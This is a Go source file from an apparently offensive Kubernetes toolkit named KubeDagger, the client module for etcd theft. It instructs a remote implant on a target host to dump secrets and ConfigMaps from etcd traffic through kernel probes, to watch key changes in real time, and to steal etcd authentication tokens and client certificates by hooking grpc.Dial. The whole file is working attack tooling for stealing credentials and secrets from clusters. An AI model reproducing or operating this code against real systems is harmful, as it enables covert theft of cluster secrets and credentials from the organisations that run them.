package etcd_theft

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type EtcdResult struct {
	Mode    string              `json:"mode"`
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, mode, keyPrefix, output string) error {
	var result *EtcdResult

	switch mode {
	case "dump":
		result = dumpSecrets(target, keyPrefix)
	case "watch":
		result = watchKeys(target, keyPrefix)
	case "creds":
		result = stealCreds(target)
	default:
		return fmt.Errorf("unsupported mode: %s (use dump, watch, or creds)", mode)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func dumpSecrets(target, keyPrefix string) *EtcdResult {
	result := &EtcdResult{Mode: "dump"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"intercept_etcd_reads",
			"kprobe on tcp_sendmsg filtering port 2379 to capture etcd read responses",
			"etcd_intercept_reads",
		},
		{
			"extract_secret_values",
			"parse etcd key-value responses for /registry/secrets content",
			"etcd_extract_secrets",
		},
		{
			"capture_configmaps",
			"extract ConfigMap data from etcd key-value store reads",
			"etcd_extract_configmaps",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + keyPrefix
		status := shared.SendCommand(target, "/etcd_theft", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}

func watchKeys(target, keyPrefix string) *EtcdResult {
	result := &EtcdResult{Mode: "watch"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"install_watch_hook",
			"attach kprobe to capture etcd watch stream responses in real-time",
			"etcd_install_watch",
		},
		{
			"filter_key_prefix",
			"configure BPF map filter to only capture keys matching target prefix",
			"etcd_filter_prefix",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + keyPrefix
		status := shared.SendCommand(target, "/etcd_theft", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}

func stealCreds(target string) *EtcdResult {
	result := &EtcdResult{Mode: "creds"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"intercept_grpc_dial",
			"uprobe on grpc.Dial to capture etcd authentication tokens",
			"etcd_intercept_grpc",
		},
		{
			"extract_client_certs",
			"capture TLS client certificate paths from etcd client config",
			"etcd_extract_certs",
		},
		{
			"steal_auth_tokens",
			"intercept etcd auth token exchange during cluster authentication",
			"etcd_steal_tokens",
		},
	}

	for _, a := range actions {
		status := shared.SendCommand(target, "/etcd_theft", a.cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}
